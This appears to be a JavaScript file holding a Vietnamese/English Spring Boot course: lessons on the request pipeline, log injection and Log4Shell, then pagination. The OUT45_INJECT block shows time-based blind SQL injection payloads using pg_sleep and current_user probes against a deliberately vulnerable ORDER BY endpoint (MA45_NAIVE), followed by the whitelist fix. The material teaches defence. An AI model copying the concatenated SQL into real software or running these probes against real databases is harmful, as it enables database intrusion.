<h3>🎤 What the interviewer will ask</h3>
<ol>
  <li><strong>"Filter vs interceptor?"</strong> — Filter: servlet level, every request, before DispatcherServlet, no knowledge of handlers. Interceptor: inside Spring MVC, after handler mapping, knows the controller method; has preHandle/postHandle/afterCompletion.</li>
  <li><strong>"Describe the path of a request in Spring MVC."</strong> — Tomcat thread ⇒ filter chain ⇒ DispatcherServlet ⇒ HandlerMapping finds the handler ⇒ interceptors preHandle ⇒ HandlerAdapter resolves arguments (converters) and calls the controller ⇒ return value written by a converter ⇒ postHandle/afterCompletion ⇒ filters unwind.</li>
  <li><strong>"Why doesn't postHandle run sometimes?"</strong> — It runs only if the handler completed without exception; use afterCompletion for always-run logic.</li>
  <li><strong>"Where is Spring Security in this picture?"</strong> — A single filter (<code>DelegatingFilterProxy</code> ⇒ <code>FilterChainProxy</code>) containing its own chain of security filters, before DispatcherServlet.</li>
  <li><strong>"What is log injection and how does it relate to Log4Shell?"</strong> — Attacker-controlled data in log messages; at minimum it forges records, with Log4j 2's lookups it executed code. Structured logging, validation, patched libraries.</li>
</ol>

<h3>🧪 Practice (20 minutes)</h3>
<div class="callout ok"><ol>
  <li>Write an interceptor that logs a <strong>WARN</strong> for any request slower than 200&nbsp;ms, with method, path, controller class + method name, duration and status.</li>
  <li>It must be correct when many requests run in parallel.</li>
</ol>
<p><strong>Done when:</strong> calling a fast endpoint logs nothing, and an endpoint that sleeps 350&nbsp;ms logs exactly one WARN line naming it.</p></div>
${giai('Show one solution', `${MA44_GIAI}
${OUT44_GIAI}
<p>The start time is stored in a <strong>request attribute</strong>, not in a field: the interceptor is a singleton shared by all threads (the lesson 3.4 bug), while a request attribute belongs to one request.</p>`)}

<h3>🗂 Key terms</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">DispatcherServlet</span><span class="v">Spring MVC's front controller: one servlet that dispatches every request to handlers.</span></div>
  <div class="kv"><span class="k">Filter / filter chain</span><span class="v">Servlet-level component wrapping every request; filters call each other through <code>chain.doFilter</code>.</span></div>
  <div class="kv"><span class="k">HandlerInterceptor</span><span class="v">Spring MVC hook around the chosen handler: preHandle, postHandle, afterCompletion.</span></div>
  <div class="kv"><span class="k">HandlerAdapter</span><span class="v">Calls the handler: resolves arguments, invokes the method, handles the return value.</span></div>
  <div class="kv"><span class="k">MDC</span><span class="v">Mapped Diagnostic Context: per-thread key/values added to every log line.</span></div>
  <div class="kv"><span class="k">Log injection</span><span class="v">Attacker-controlled input written to logs, forging or corrupting records (CWE-117).</span></div>
</div>

<h3>📌 Summary</h3>
<ul>
  <li>One Tomcat thread carries a request through the filter chain, DispatcherServlet, interceptors, argument resolution and your method — the stack trace shows it.</li>
  <li>Filter for everything HTTP (IDs, limits, security), interceptor when you need the handler, advice for exceptions.</li>
  <li>postHandle skips on exceptions; error dispatches skip OncePerRequestFilter.</li>
  <li>User input in logs is an attack surface: validate IDs, use structured logging, remember Log4Shell.</li>
</ul>

<h3>📚 Go deeper</h3>
${tl('https://docs.spring.io/spring-framework/reference/web/webmvc/mvc-servlet.html', '🌱', 'Spring Framework — DispatcherServlet', 'Special beans, processing sequence, interceptors, exception resolvers.')}
${tl('https://docs.spring.io/spring-boot/reference/features/logging.html#features.logging.structured', '🌱', 'Spring Boot — Structured logging', 'ECS, GELF and Logstash formats with one property.')}

<h3>Sources</h3>
<ul>
  <li>Outputs above: PipeApp and GiaiApp on Spring Boot 4.1.2 / Tomcat 11.0.27, Temurin 21.0.12.1; Express 5.3.0 on Node 22.22.2 (19/11/2026).</li>
  <li>NVD, <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228" target="_blank" rel="noopener">CVE-2021-44228</a> (10/12/2021). MITRE, CWE-117 Improper Output Neutralization for Logs.</li>
</ul>
</div>
`;

const L44_VI = `
<div class="ml-vi">
<span class="eyebrow">Chương 4 · Bài 4.4</span>
<h2>Đường đi của request: DispatcherServlet, filter và interceptor</h2>
<p class="lead">Giữa socket mạng và hàm <code>@GetMapping</code> của bạn có khoảng năm mươi lời gọi hàm Java. Phần lớn thời gian bạn không cần quan tâm — cho tới khi cần làm một việc cho <em>mọi</em> request (mã request trên mọi dòng log, giới hạn cỡ body, đo thời gian, kiểm quyền truy cập) và phải chọn đặt nó ở đâu. Spring có ba chỗ: <strong>Filter</strong> của servlet, <strong>HandlerInterceptor</strong> của Spring MVC và <strong>@ControllerAdvice</strong>. Ta đặt mỗi loại một cái vào một ứng dụng đang chạy, in ngăn xếp gọi thật từ Tomcat tới controller, xem mỗi lớp thấy gì với một request bình thường, một exception và một 404, rồi dùng chính đường ống này để giả mạo một dòng log — cùng họ tấn công với Log4Shell — và sửa nó.</p>

<h3>Đời thường trước đã</h3>
<p>Một bưu kiện gửi tới toà Alpha đi qua: <strong>cổng bảo vệ</strong> ở lối vào (thấy mọi bưu kiện, kể cả gửi tới phòng không tồn tại; có thể từ chối kiện quá khổ; đóng mã theo dõi), rồi <strong>lễ tân tầng</strong> (đã biết bưu kiện gửi phòng nào, cho ai; có thể kiểm giờ làm việc của người đó), rồi <strong>người nhận</strong> xử lý. Nếu người nhận không xử lý được, <strong>quầy khiếu nại</strong> viết câu trả lời theo mẫu. Cổng = filter, lễ tân = interceptor, người nhận = controller, quầy khiếu nại = <code>@ControllerAdvice</code>.</p>

<h3>Ngăn xếp gọi thật</h3>
<p>Thay vì vẽ sơ đồ, hãy hỏi chính JVM. Endpoint này trả về ngăn xếp gọi của chính nó (đã lọc lấy các khung đáng xem):</p>
${OUT44_TRACE}
<p>Đọc từ dưới lên:</p>
<ol>
  <li><strong>Tomcat</strong>: một luồng làm việc trong pool (<code>ThreadPoolExecutor</code>, bài 2.3) nhận socket (<code>NioEndpoint</code>), phân tích HTTP (<code>Http11Processor</code>), đi qua các valve của Tomcat (host, context, xác thực, báo lỗi).</li>
  <li><strong>Chuỗi filter của servlet</strong> (<code>ApplicationFilterChain</code>): <code>RequestIdFilter</code> của ta trước, rồi <code>CharacterEncodingFilter</code>, <code>FormContentFilter</code>, <code>RequestContextFilter</code> của Spring Boot, <code>BodyLimitFilter</code> của ta, <code>WsFilter</code> của Tomcat. Mỗi filter gọi <code>chain.doFilter</code> để chuyển request đi tiếp — ngăn xếp lồng nhau, nên mỗi filter còn chạy tiếp <em>sau khi</em> mọi thứ bên trong nó xong.</li>
  <li><strong>DispatcherServlet</strong>: servlet duy nhất của Spring MVC. <code>doDispatch</code> tra handler trong bảng ánh xạ (bài 4.1), chạy các interceptor, gọi <code>HandlerAdapter</code>.</li>
  <li><strong>HandlerAdapter</strong> chuẩn bị tham số (<code>@PathVariable</code>, <code>@RequestBody</code> qua bộ chuyển đổi — bài 4.3) và gọi hàm của bạn bằng reflection (<code>Method.invoke</code>).</li>
</ol>
<p>Một luồng làm hết, từ socket tới controller rồi quay về. Đó là lý do controller chậm sẽ giữ một luồng Tomcat (bài 2.5), và lý do dữ liệu riêng của từng request có thể nằm trong một <code>ThreadLocal</code> như MDC của log — miễn là bạn dọn nó đi.</p>

<h3>Ba thành phần</h3>
${MA44_FILTER}
${MA44_LIMIT}
${MA44_INTER}
${MA44_CONFIG}
${MA44_ADVICE}
${MA44_CTRL}

<h3>Request 1: mọi thứ chạy đúng</h3>
${OUT44_OK}
<p>Thứ tự là: filter vào → <code>preHandle</code> của interceptor (đã biết handler là <code>LabController.labs</code>) → controller → <code>postHandle</code> → <code>afterCompletion</code> → filter ra kèm mã trạng thái và thời gian. Mọi dòng đều mang <code>rid=req-an-0001</code> vì filter đã đặt nó vào MDC — khi người dùng báo lỗi, tìm trong log theo mã ở header response là ra đúng request của họ, kể cả khi hàng trăm request đan xen.</p>

<h3>Request 2: controller ném exception</h3>
${OUT44_ADVICE}
<p><code>postHandle</code> <strong>không</strong> chạy — nó chỉ chạy sau khi handler xong suôn sẻ. Advice đã biến exception thành 409 bên trong DispatcherServlet, nên <code>afterCompletion</code> thấy <code>ex=-</code> (exception đã được xử lý) và filter thấy một response 409 bình thường. Việc "lúc nào cũng phải làm" (đo giờ, dọn dẹp) đặt trong <code>afterCompletion</code> hoặc trong <code>finally</code> của filter, đừng bao giờ đặt trong <code>postHandle</code>.</p>

<h3>Request 3: không có controller nào</h3>
${OUT44_404}
<p>Ba điều học từ bốn dòng. Interceptor chạy với handler là <code>ResourceHttpRequestHandler</code> — Spring đã thử phục vụ một tệp tĩnh tên <code>khong-co</code>. Filter kết thúc với 404 và gỡ mã request. Rồi Tomcat chuyển tiếp request tới <code>/error</code> (một <em>ERROR dispatch</em>) để dựng body JSON; <code>OncePerRequestFilter</code> mặc định bỏ qua error dispatch, nên các dòng đó có <code>rid</code> rỗng. Nếu cần mã request cả trong phần xử lý lỗi, giữ nó trong một thuộc tính của request hoặc ghi đè <code>shouldNotFilterErrorDispatch()</code>.</p>

<h3>Khi nào dùng cái nào?</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Filter (servlet)</span><span class="v">Thấy mọi request, kể cả tệp tĩnh, 404, request Spring MVC không bao giờ xử lý. Có thể bọc hoặc thay request/response, từ chối sớm. Không biết gì về controller. Dùng cho: mã request + MDC, giới hạn cỡ body, CORS, nén, bảo mật (<strong>Spring Security là một chuỗi filter</strong> — Chương 9).</span></div>
  <div class="kv"><span class="k">HandlerInterceptor (Spring MVC)</span><span class="v">Chạy bên trong DispatcherServlet, sau khi đã chọn handler: biết hàm controller và annotation của nó. Dùng cho: đo giờ theo endpoint, ghi vết theo handler, kiểm tra đơn giản dựa trên annotation.</span></div>
  <div class="kv"><span class="k">@ControllerAdvice / @RestControllerAdvice</span><span class="v">Biến exception thành response cho mọi controller; cũng có thể xử lý trước body. Dùng cho: định dạng lỗi thống nhất (Chương 5).</span></div>
  <div class="kv"><span class="k">Aspect (bài 3.5)</span><span class="v">Bọc hàm của bean, không phải HTTP: chạy y như nhau dù service được gọi từ controller, việc hẹn giờ hay test.</span></div>
</div>

<h3>Giới hạn body của bài 4.3</h3>
${OUT44_BIG}
<p>Body 30&nbsp;MB mà Jackson đã nhận ở bài 4.3 giờ bị từ chối với 413 trong 0 ms, trước khi một byte nào được đọc — filter dừng chuỗi bằng cách không gọi <code>chain.doFilter</code>. (Client có thể nói dối hoặc bỏ <code>Content-Length</code> bằng chunked encoding; muốn bảo vệ trọn vẹn thì giới hạn thêm luồng đọc hoặc để reverse proxy chặn.)</p>

<h3>Luồng: cùng đường ống trên virtual thread</h3>
${OUT44_VIRTUAL}
<p>Với <code>spring.threads.virtual.enabled=true</code> (bài 2.5), Tomcat chạy mỗi request trên một virtual thread (<code>tomcat-handler-0</code> thay cho <code>http-nio-8080-exec-1</code>). Đường ống y hệt; MDC vẫn chạy vì mỗi request vẫn đi trên một luồng từ đầu tới cuối.</p>

<h3>🕵️ Góc hacker — giả mạo dòng log</h3>
<p>Endpoint tìm kiếm ghi lại câu tìm của người dùng: <code>log.info("tìm lab q={}", q)</code>. Trông vô hại. Kẻ tấn công gửi câu tìm chứa ký tự xuống dòng (<code>%0A</code>) theo sau là chữ được định dạng giống một dòng log:</p>
${OUT44_INJECT}
<p>Dòng log thứ tư do kẻ tấn công viết. Nó đúng định dạng, tên luồng đáng tin, có mã request — và nói admin vừa đăng nhập. Người điều tra sự cố sau này đọc một câu chuyện sai; luật giám sát đếm "admin login OK" bị lừa. Đây là <strong>log injection</strong> (chèn log, CWE-117). Logback, như phần lớn thư viện log dạng chữ, ghi nguyên văn thông điệp.</p>
<div class="callout warn"><p><strong>Sự cố thật — Log4Shell, CVE-2021-44228 (công bố 10/12/2021, CVSS 10).</strong> Cùng gốc rễ, đẩy tới tận cùng: Apache Log4j 2 thực thi các phép tra <code>\${jndi:ldap://…}</code> nằm trong thông điệp <em>được ghi log</em>, nên bất kỳ chuỗi nào kẻ tấn công điều khiển mà lọt vào một dòng log — header User-Agent, tên đăng nhập, tin nhắn chat — đều có thể khiến server tải và chạy mã từ server của kẻ tấn công. Nó ảnh hưởng tới vô số ứng dụng và sản phẩm Java; lời khuyên khi đó đơn giản là "mọi thứ người dùng gửi rồi sẽ bị ghi log". Thư viện log mặc định của Spring Boot là Logback, không phải lõi Log4j 2, nên ứng dụng Boot để mặc định không bị khai thác trực tiếp — Mục 0 ("Bắt đầu tại đây", phần 2) đã cho thấy jar có <code>log4j-api</code> nhưng không có <code>log4j-core</code>.</p>
<p><strong>Cách phòng:</strong> ghi log dữ liệu có cấu trúc thay vì nối chuỗi; không bao giờ tin mã và header client gửi (filter của ta chỉ nhận <code>[A-Za-z0-9-]{8,64}</code>); cập nhật bản vá thư viện log; không ghi bí mật vào log.</p></div>
<p>Hai trong các lớp phòng thủ đó, chạy thật. Trước hết là filter từ chối một mã request độc hại:</p>
${OUT44_FAKEID}
<p>Giá trị của client không khớp mẫu, nên server tự sinh mã của nó — không chữ nào của kẻ tấn công lọt vào log. Thứ hai, <strong>log có cấu trúc</strong> có sẵn trong Spring Boot (một thuộc tính) ghi mỗi dòng thành JSON, ở đó ký tự xuống dòng thành hai ký tự <code>\\n</code> nằm trong chuỗi và không mở được bản ghi mới:</p>
${OUT44_ECS}

<h3>So với Express</h3>
${MA44_NODE}
${OUT44_NODE}
<p>Express có một khái niệm duy nhất — middleware, chạy theo thứ tự đăng ký, với middleware lỗi (bốn tham số) tương đương <code>@ControllerAdvice</code>. Spring chia cùng ý tưởng đó thành các lớp biết những thứ khác nhau: filter chỉ biết HTTP, interceptor biết thêm hàm handler, advice biết kiểu exception. Câu trả lời phỏng vấn: "filter của Spring giống middleware Express đăng ký trước router; interceptor giống middleware gắn vào route đã khớp."</p>

<h3>Đời thường và đi làm</h3>
<ul>
  <li><strong>"Khách nói đặt lịch lỗi lúc 10:42"</strong>: có mã request trong header response và trên mọi dòng log, bộ phận hỗ trợ hỏi khách (hoặc màn hình lỗi của frontend hiện sẵn) mã đó, và bạn tìm ra đúng request trong vài giây. Chuyển cùng mã đó cho các lời gọi phía sau (Chương 15 làm bằng tracing).</li>
  <li><strong>Header của tôi đi đâu mất?</strong> Nếu một filter do thư viện đăng ký chạy trước filter của bạn và đọc mất body, controller của bạn thấy body rỗng — đặt thứ tự filter tường minh bằng <code>@Order</code>, và in chuỗi ra (mẹo ngăn xếp ở trên) khi nghi ngờ.</li>
  <li><strong>Review bảo mật:</strong> grep <code>log.*(request|getParameter|getHeader)</code>; mỗi chỗ trúng là một nơi dữ liệu người dùng chạm tới log.</li>
</ul>

<h3>🎤 Phỏng vấn viên sẽ hỏi</h3>
<ol>
  <li><strong>"Filter khác interceptor thế nào?"</strong> — Filter: tầng servlet, mọi request, trước DispatcherServlet, không biết handler. Interceptor: bên trong Spring MVC, sau khi tra handler, biết hàm controller; có preHandle/postHandle/afterCompletion.</li>
  <li><strong>"Mô tả đường đi của một request trong Spring MVC."</strong> — Luồng Tomcat ⇒ chuỗi filter ⇒ DispatcherServlet ⇒ HandlerMapping tìm handler ⇒ preHandle của interceptor ⇒ HandlerAdapter chuẩn bị tham số (bộ chuyển đổi) và gọi controller ⇒ giá trị trả về được bộ chuyển đổi ghi ra ⇒ postHandle/afterCompletion ⇒ các filter chạy nốt phần sau.</li>
  <li><strong>"Vì sao có lúc postHandle không chạy?"</strong> — Nó chỉ chạy khi handler xong mà không có exception; việc luôn phải chạy thì đặt ở afterCompletion.</li>
  <li><strong>"Spring Security nằm ở đâu trong bức tranh này?"</strong> — Một filter duy nhất (<code>DelegatingFilterProxy</code> ⇒ <code>FilterChainProxy</code>) chứa chuỗi filter bảo mật riêng của nó, đứng trước DispatcherServlet.</li>
  <li><strong>"Log injection là gì, liên quan gì tới Log4Shell?"</strong> — Dữ liệu kẻ tấn công điều khiển lọt vào thông điệp log; nhẹ thì giả mạo bản ghi, với phép tra của Log4j 2 thì chạy được mã. Log có cấu trúc, kiểm tra đầu vào, vá thư viện.</li>
</ol>

<h3>🧪 Thực hành (20 phút)</h3>
<div class="callout ok"><ol>
  <li>Viết một interceptor ghi <strong>WARN</strong> cho mọi request chậm hơn 200&nbsp;ms, kèm phương thức, đường dẫn, tên class + tên hàm controller, thời gian và mã trạng thái.</li>
  <li>Nó phải đúng khi nhiều request chạy song song.</li>
</ol>
<p><strong>Đạt khi:</strong> gọi endpoint nhanh thì không ghi gì, còn một endpoint ngủ 350&nbsp;ms ghi đúng một dòng WARN nêu tên nó.</p></div>
${giai('Xem một lời giải', `${MA44_GIAI}
${OUT44_GIAI}
<p>Thời điểm bắt đầu được giữ trong một <strong>thuộc tính của request</strong>, không phải trong field: interceptor là singleton dùng chung cho mọi luồng (lỗi của bài 3.4), còn thuộc tính request thuộc về riêng một request.</p>`)}

<h3>🗂 Thuật ngữ</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">DispatcherServlet</span><span class="v">Front controller của Spring MVC: một servlet duy nhất điều phối mọi request tới các handler.</span></div>
  <div class="kv"><span class="k">Filter / chuỗi filter</span><span class="v">Thành phần tầng servlet bọc quanh mọi request; các filter gọi nhau qua <code>chain.doFilter</code>.</span></div>
  <div class="kv"><span class="k">HandlerInterceptor</span><span class="v">Điểm móc của Spring MVC quanh handler đã chọn: preHandle, postHandle, afterCompletion.</span></div>
  <div class="kv"><span class="k">HandlerAdapter</span><span class="v">Gọi handler: chuẩn bị tham số, gọi hàm, xử lý giá trị trả về.</span></div>
  <div class="kv"><span class="k">MDC</span><span class="v">Mapped Diagnostic Context: cặp khoá/giá trị theo từng luồng, được thêm vào mọi dòng log.</span></div>
  <div class="kv"><span class="k">Log injection</span><span class="v">Dữ liệu kẻ tấn công điều khiển bị ghi vào log, làm giả hoặc hỏng bản ghi (CWE-117).</span></div>
</div>

<h3>📌 Tóm tắt</h3>
<ul>
  <li>Một luồng Tomcat mang request qua chuỗi filter, DispatcherServlet, interceptor, bước chuẩn bị tham số và hàm của bạn — ngăn xếp gọi cho thấy điều đó.</li>
  <li>Filter cho mọi việc thuộc HTTP (mã request, giới hạn, bảo mật), interceptor khi cần biết handler, advice cho exception.</li>
  <li>postHandle bị bỏ khi có exception; error dispatch bị OncePerRequestFilter bỏ qua.</li>
  <li>Dữ liệu người dùng trong log là bề mặt tấn công: kiểm mã request, dùng log có cấu trúc, nhớ Log4Shell.</li>
</ul>

<h3>📚 Học sâu</h3>
${tl('https://docs.spring.io/spring-framework/reference/web/webmvc/mvc-servlet.html', '🌱', 'Spring Framework — DispatcherServlet', 'Các bean đặc biệt, trình tự xử lý, interceptor, exception resolver.')}
${tl('https://docs.spring.io/spring-boot/reference/features/logging.html#features.logging.structured', '🌱', 'Spring Boot — Structured logging', 'Định dạng ECS, GELF và Logstash bằng một thuộc tính.')}

<h3>Nguồn</h3>
<ul>
  <li>Output ở trên: PipeApp và GiaiApp trên Spring Boot 4.1.2 / Tomcat 11.0.27, Temurin 21.0.12.1; Express 5.3.0 trên Node 22.22.2 (19/11/2026).</li>
  <li>NVD, <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228" target="_blank" rel="noopener">CVE-2021-44228</a> (10/12/2021). MITRE, CWE-117 Improper Output Neutralization for Logs.</li>
</ul>
</div>
`;

// ===== Bài 4.5 =====
const MA45_LAB = java("@RestController\n@RequestMapping(\"/labs\")\npublic class LabController {\n    private final JdbcClient db;\n\n    LabController(JdbcClient db) { this.db = db; }\n\n    public record LabRequest(String code, String name, int capacity) {}\n    public record LabView(long id, String code, String name, int capacity) {}\n\n    @PostMapping\n    public ResponseEntity<LabView> create(@RequestBody LabRequest r) {\n        long id = db.sql(\"INSERT INTO labs(code, name, capacity) VALUES (?, ?, ?) RETURNING id\")\n                .params(r.code(), r.name(), r.capacity()).query(Long.class).single();\n        URI location = ServletUriComponentsBuilder.fromCurrentRequest()      // http://host:port/labs\n                .path(\"/{id}\").buildAndExpand(id).toUri();                   //  + /5\n        return ResponseEntity.created(location).body(new LabView(id, r.code(), r.name(), r.capacity()));\n    }\n\n    @GetMapping(\"/{id}\")\n    public ResponseEntity<LabView> one(@PathVariable long id) {\n        return ResponseEntity.of(db.sql(\"SELECT id, code, name, capacity FROM labs WHERE id = ?\")\n                .param(id).query(LabView.class).optional());                 // Optional rỗng ⇒ 404\n    }\n\n    @DeleteMapping(\"/{id}\")\n    public ResponseEntity<Void> delete(@PathVariable long id) {\n        int n = db.sql(\"DELETE FROM labs WHERE id = ?\").param(id).update();\n        return n == 0 ? ResponseEntity.notFound().build() : ResponseEntity.noContent().build();\n    }\n\n    @ExceptionHandler(DuplicateKeyException.class)                           // UNIQUE(code) bị vi phạm\n    public ResponseEntity<Map<String, String>> duplicate() {\n        return ResponseEntity.status(409).body(Map.of(\"error\", \"lab code already exists\"));\n    }\n}");
const OUT45_CRUD = out("$ curl -i -X POST localhost:8080/labs -H 'Content-Type: application/json' -d '{\"code\":\"SEC-04\",\"name\":\"Lab Bảo mật\",\"capacity\":20}'\nHTTP/1.1 201 \nLocation: http://localhost:8080/labs/4\nContent-Type: application/json\n\n{\"id\":4,\"code\":\"SEC-04\",\"name\":\"Lab Bảo mật\",\"capacity\":20}\n$ curl -i -X POST localhost:8080/labs -H 'Content-Type: application/json' -d '{\"code\":\"SEC-04\",\"name\":\"Lab trùng mã\",\"capacity\":20}'\nHTTP/1.1 409 \nContent-Type: application/json\n\n{\"error\":\"lab code already exists\"}\n$ curl -i -X DELETE localhost:8080/labs/4\nHTTP/1.1 204 \n\n$ curl -i -X DELETE localhost:8080/labs/4\nHTTP/1.1 404 \nContent-Length: 0");
const SQL45_SCHEMA = sql("CREATE TABLE bookings (id bigserial PRIMARY KEY, lab_code text NOT NULL, student text NOT NULL, start_at timestamptz NOT NULL);\n-- 1 000 000 lượt đặt để đo phân trang\nINSERT INTO bookings(lab_code, student, start_at)\nSELECT (ARRAY['AI-01','IOT-02','NET-03'])[1 + g % 3], 'sv' || lpad((g % 5000)::text, 4, '0'),\n       timestamptz '2026-01-05 07:00+07' + (g % 20000) * interval '30 minutes'\nFROM generate_series(1, 1000000) g;\nCREATE INDEX bookings_start ON bookings(start_at, id);");
const MA45_QUERY = java("@RestController\npublic class BookingQueryController {\n    private final JdbcClient db;\n\n    BookingQueryController(JdbcClient db) { this.db = db; }\n\n    public record BookingView(long id, String labCode, String student, Instant startAt) {}\n    public record Page<T>(List<T> items, int page, int size, long totalItems, int totalPages) {}\n    public record Slice<T>(List<T> items, String nextCursor) {}\n\n    private static final Map<String, String> SORTABLE = Map.of(\"id\", \"id\", \"startAt\", \"start_at\", \"labCode\", \"lab_code\");\n\n    /** Phân trang OFFSET: ?page=0&size=20&sort=startAt,desc */\n    @GetMapping(\"/bookings\")\n    public Page<BookingView> page(@RequestParam(defaultValue = \"0\") int page,\n                                  @RequestParam(defaultValue = \"20\") int size,\n                                  @RequestParam(defaultValue = \"id,asc\") String sort) {\n        size = Math.clamp(size, 1, 100);                                   // không bao giờ tin size của client\n        page = Math.max(page, 0);\n        String[] s = sort.split(\",\");\n        String col = SORTABLE.get(s[0]);                                   // ORDER BY không đặt \"?\" được ⇒ danh sách trắng\n        if (col == null) throw new IllegalArgumentException(\"cannot sort by \" + s[0]);\n        String dir = s.length > 1 && s[1].equalsIgnoreCase(\"desc\") ? \"DESC\" : \"ASC\";\n        List<BookingView> items = db.sql(\"SELECT id, lab_code, student, start_at FROM bookings ORDER BY \"\n                        + col + \" \" + dir + \", id \" + dir + \" LIMIT ? OFFSET ?\")\n                .params(size, (long) page * size).query(BookingView.class).list();\n        long total = db.sql(\"SELECT count(*) FROM bookings\").query(Long.class).single();\n        return new Page<>(items, page, size, total, (int) Math.ceil((double) total / size));\n    }\n\n    /** Phân trang KEYSET (con trỏ): ?after=<id cuối của trang trước>&size=20 */\n    @GetMapping(\"/bookings/after\")\n    public Slice<BookingView> after(@RequestParam(defaultValue = \"0\") long after,\n                                    @RequestParam(defaultValue = \"20\") int size) {\n        size = Math.clamp(size, 1, 100);\n        List<BookingView> items = db.sql(\"SELECT id, lab_code, student, start_at FROM bookings WHERE id > ? ORDER BY id LIMIT ?\")\n                .params(after, size).query(BookingView.class).list();\n        String next = items.size() < size ? null : String.valueOf(items.getLast().id());\n        return new Slice<>(items, next);\n    }");
const MA45_NAIVE = java("    /** CÁCH SAI — để thấy vì sao phải làm như trên: size không giới hạn, sort nối thẳng vào SQL. */\n    @GetMapping(\"/naive/bookings\")\n    public List<BookingView> naive(@RequestParam(defaultValue = \"20\") int size,\n                                   @RequestParam(defaultValue = \"id\") String sort) {\n        return db.sql(\"SELECT id, lab_code, student, start_at FROM bookings ORDER BY \" + sort + \" LIMIT \" + size)\n                .query(BookingView.class).list();\n    }");
const OUT45_PAGE = out("$ curl 'localhost:8080/bookings?page=0&size=3&sort=startAt,desc'\n{\"items\":[{\"id\":999999,\"labCode\":\"AI-01\",\"student\":\"sv4999\",\"startAt\":\"2027-02-25T15:30:00Z\"},{\"id\":979999,\"labCode\":\"IOT-02\",\"student\":\"sv4999\",\"startAt\":\"2027-02-25T15:30:00Z\"},{\"id\":959999,\"labCode\":\"NET-03\",\"student\":\"sv4999\",\"startAt\":\"2027-02-25T15:30:00Z\"}],\"page\":0,\"size\":3,\"totalItems\":1000000,\"totalPages\":333334}\n$ curl 'localhost:8080/bookings?page=0&size=1000000'\n{\"items\":[{\"id\":1,\"labCode\":\"IOT-02\",\"student\":\"sv0001\",\"startAt\":\"2026-01-05T00:30:00Z\"},{\"id\":2,\"labCode\":\"NET-03\",\"st");
const OUT45_KEYSET = out("$ curl 'localhost:8080/bookings/after?size=3'\n{\"items\":[{\"id\":1,\"labCode\":\"IOT-02\",\"student\":\"sv0001\",\"startAt\":\"2026-01-05T00:30:00Z\"},{\"id\":2,\"labCode\":\"NET-03\",\"student\":\"sv0002\",\"startAt\":\"2026-01-05T01:00:00Z\"},{\"id\":3,\"labCode\":\"AI-01\",\"student\":\"sv0003\",\"startAt\":\"2026-01-05T01:30:00Z\"}],\"nextCursor\":\"3\"}\n$ curl 'localhost:8080/bookings/after?after=3&size=3'\n{\"items\":[{\"id\":4,\"labCode\":\"IOT-02\",\"student\":\"sv0004\",\"startAt\":\"2026-01-05T02:00:00Z\"},{\"id\":5,\"labCode\":\"NET-03\",\"student\":\"sv0005\",\"startAt\":\"2026-01-05T02:30:00Z\"},{\"id\":6,\"labCode\":\"AI-01\",\"student\":\"sv0006\",\"startAt\":\"2026-01-05T03:00:00Z\"}],\"nextCursor\":\"6\"}");
const OUT45_DEEP = out("# trang sâu: OFFSET 999 900 vs con trỏ after=999900 (cùng 100 dòng)\n$ curl -s -o /dev/null -w '%{http_code} %{size_download} byte %{time_total}s\\n' 'localhost:8080/bookings?page=9999&size=100'\n200 8542 byte 0.102295s\n200 8542 byte 0.132104s\n200 8542 byte 0.121399s\n$ curl -s -o /dev/null -w '%{http_code} %{size_download} byte %{time_total}s\\n' 'localhost:8080/bookings/after?after=999900&size=100'\n200 8502 byte 0.004390s\n200 8502 byte 0.005331s\n200 8502 byte 0.009985s");
const OUT45_EXPLAIN = out("$ psql -c \"EXPLAIN ANALYZE SELECT … ORDER BY id LIMIT 100 OFFSET 999900\"\nLimit  (cost=33333.09..33336.43 rows=100 width=29) (actual time=131.958..132.055 rows=100 loops=1)\n->  Index Scan using bookings_pkey on bookings  (cost=0.42..33336.43 rows=1000000 width=29) (actual time=0.031..110.739 rows=1000000 loops=1)\nExecution Time: 132.124 ms\n$ psql -c \"EXPLAIN ANALYZE SELECT … WHERE id > 999900 ORDER BY id LIMIT 100\"\nLimit  (cost=0.42..9.79 rows=100 width=29) (actual time=0.013..0.024 rows=100 loops=1)\n->  Index Scan using bookings_pkey on bookings  (cost=0.42..10.26 rows=105 width=29) (actual time=0.012..0.019 rows=100 loops=1)\nIndex Cond: (id > 999900)\nExecution Time: 0.045 ms\n$ psql -c \"EXPLAIN ANALYZE SELECT count(*) FROM bookings\"\nExecution Time: 37.247 ms");
const OUT45_SIZE = out("# size khổng lồ: bản có giới hạn (clamp 100) vs bản ngây thơ\n$ curl -s -o /dev/null -w '%{http_code} %{size_download} byte %{time_total}s\\n' 'localhost:8080/bookings?size=1000000'\n200 8130 byte 0.029227s\n200 8130 byte 0.038123s\n200 8130 byte 0.035904s\n$ curl -s -o /dev/null -w '%{http_code} %{size_download} byte %{time_total}s\\n' 'localhost:8080/naive/bookings?size=1000000'\n200 84555564 byte 7.669076s\n200 84555564 byte 6.705522s\n200 84555564 byte 6.475488s");
const OUT45_INJECT = out("# sort nối thẳng vào ORDER BY: thử chèn một câu SQL con\n$ curl -s -o /dev/null -w '%{time_total}s\\n' -G localhost:8080/naive/bookings --data-urlencode \"sort=id\"\n0.003095s\n$ curl -s -o /dev/null -w '%{time_total}s\\n' -G localhost:8080/naive/bookings --data-urlencode \"sort=(SELECT 1 FROM pg_sleep(3))\"\n3.008681s\n$ curl -s -o /dev/null -w '%{time_total}s\\n' -G localhost:8080/naive/bookings --data-urlencode \"sort=(CASE WHEN (SELECT substr(current_user,1,1))='p' THEN (SELECT 1 FROM pg_sleep(3)) ELSE 1 END)\"\n3.006029s\n$ curl -s -o /dev/null -w '%{time_total}s\\n' -G localhost:8080/naive/bookings --data-urlencode \"sort=(CASE WHEN (SELECT substr(current_user,1,1))='x' THEN (SELECT 1 FROM pg_sleep(3)) ELSE 1 END)\"\n0.003621s\n# cùng chuỗi đó vào bản có danh sách trắng\n$ curl -s -G localhost:8080/bookings --data-urlencode 'sort=(SELECT 1 FROM pg_sleep(3))'\n{\"error\":\"cannot sort by (SELECT 1 FROM pg_sleep(3))\"}");
